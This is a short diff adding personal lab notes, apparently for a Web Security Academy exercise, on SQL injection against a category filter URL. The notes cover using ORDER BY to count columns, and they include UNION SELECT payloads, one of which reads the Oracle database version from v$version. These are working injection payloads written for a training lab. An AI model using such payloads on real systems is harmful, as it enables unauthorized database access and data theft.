@@ -1,0 +1,8 @@
+url important for us just:
+  https://xxxxxxx.web-security-academy.net/filter?category=Clothing
+add payloads after {Clothing}
+use order by 3 you see error but in 2 show the site so site have 2 columns
+after use this payload:
+  '+union+select+'1','2'+FROM+dual--
+and this payload for see version in OracleDB:
+  '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
